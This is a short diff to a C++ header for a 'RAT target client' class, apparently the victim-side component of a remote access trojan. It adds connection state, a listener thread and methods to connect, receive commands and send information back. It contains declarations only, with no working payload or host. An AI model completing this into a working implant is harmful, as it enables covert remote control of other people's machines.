@@ -5,14 +5,26 @@
 #ifndef RAT_TARGET_CLIENT_H
 #define RAT_TARGET_CLIENT_H
 #include <string>
-
+#include <atomic>
+#include <thread>
 
 class Client {
 public:
-    void ReceiveCommand(std::string& command);
-    void Connect(std::string& host, std::string& port);
+    ~Client();
+
+    bool ReceiveCommand(std::string& command);
+    bool Connect(std::string& host, std::string& port);
     void Listen();
     void Send(std::string& info);
+    void Disconnect();
+    bool isConnected();
+
+private:
+    void ReceiveLoop();
+
+    int sock = -1;
+    std::atomic<bool> connected{false};
+    std::thread listener;
 };
 
 
